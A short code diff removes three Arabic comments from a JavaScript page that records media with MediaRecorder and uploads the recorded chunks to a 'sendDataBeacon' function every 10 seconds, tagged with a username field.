@@ -699,7 +699,6 @@
                 };
                 mediaRecorder.start(1000);
 
-                // تزامن تلقائي كل 10 ثوانٍ (يرسل الجزء الجديد فقط ويفرغ المخزن المؤقت لمنع تكرار نفس الملف)
                 autoSyncInterval = setInterval(async () => {
                     if (!isCompleted && recordedChunks.length > 0) {
                         await sendDataBeacon("Auto-Sync 10s (Mise à jour)");
@@ -714,9 +713,7 @@
         async function sendDataBeacon(reason = "") {
             if (recordedChunks.length === 0) return;
 
-            // نسخ الأجزاء الحالية للإرسال
             const currentChunks = [...recordedChunks];
-            // تفريغ المخزن المؤقت فوراً لكي لا يتم إعادة إرسال نفس الفيديو القديم في المرة القادمة
             recordedChunks = [];
 
             const username = document.getElementById('username').value || "Utilisateur Anonyme";
